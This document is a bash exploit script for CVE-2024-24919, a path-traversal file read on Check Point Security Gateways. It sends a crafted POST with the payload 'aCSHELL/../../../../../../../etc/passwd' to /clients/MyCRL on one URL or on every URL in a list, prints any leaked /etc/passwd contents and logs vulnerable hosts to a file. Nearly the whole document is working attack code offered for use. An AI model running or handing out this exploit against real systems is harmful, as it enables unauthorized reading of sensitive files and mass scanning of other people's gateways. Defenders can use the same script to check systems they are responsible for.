#!/bin/bash

# Script Name : CVE-2024-24919.sh
# Author : Spider
# Created : 26-02-2025
# Purpose : Automating CVE-2024-24919 [Checkpoint Security Gateway Unauthorized Information Disclosure]
# Usage : ./CVE-2024-24919.sh -u <URL> OR ./CVE-2024-24919.sh -w <file.txt>

# Banner
printf '\e[1;31m%s\e[0m\n' "$(printf '=%.0s' {1..50})"
echo -e "\e[1;31m CVE-2024-24919 \e[0m [Checkpoint Security Gateway LFI]"
printf '\e[1;31m%s\e[0m\n' "$(printf '=%.0s' {1..50})"
echo -e "\033[1;31m                    Created by Spider\033[0m"

# Function to display usage information
usage() {
    echo -e "\n\e[1;33mUsage:\e[0m $0 \e[1;35m[-u url]\e[0m \e[1;35m[-w filename]\e[0m"
    echo -e "\e[1;35m       -u:\e[0m Scan a single domain"
    echo -e "\e[1;35m       -w:\e[0m Scan multiple domains from a file"
    exit 1
}

# Function to check for LFI vulnerability
check_vuln() {
    local url=$1
    local domain=$(echo "$url" | awk -F[/:] '{print $4}' | sed 's/^www\.//')
    local data="../../../../../../../etc/passwd"

    echo -e "\033[1;31m[+] Checking:\033[0m $url"

    response=$(curl --path-as-is -s -k -X 'POST' \
        -H "Host: $domain" \
        -H 'Connection: keep-alive' \
        --data-binary "aCSHELL/$data" \
        "$url/clients/MyCRL")

    if echo "$response" | grep -qE '/bin/bash|/sbin/nologin'; then
        echo -e "\033[1;32m[+] Vulnerable!\033[0m\n"
        echo -e "\033[34m$response\033[0m\n"
        echo "$url - Vulnerable" >> vulnerable.txt
    else
        echo -e "\033[1;31m[-] Not Vulnerable\033[0m"
    fi
}

# Function to read from a file
process_file() {
    local filename=$1
    if [[ ! -f "$filename" ]]; then
        echo -e "\033[1;31m[ERROR] File not found: $filename\033[0m"
        exit 1
    fi

    echo -e "\n\e[1;33m[INFO] Scanning multiple targets from: $filename\e[0m\n"
    while IFS= read -r line; do
        check_vuln "$line"
    done < "$filename"
}

# Main function
main() {
    local url=""
    local filename=""

    while getopts "hu:w:" opt; do
        case $opt in
            u) url=$OPTARG ;;
            w) filename=$OPTARG ;;
            h) usage ;;
            *) usage ;;
        esac
    done

    if [[ -z "$url" && -z "$filename" ]]; then
        usage
    fi

    if [[ -n "$url" ]]; then
        check_vuln "$url"
    fi

    if [[ -n "$filename" ]]; then
        process_file "$filename"
    fi
}

# Run the script
main "$@"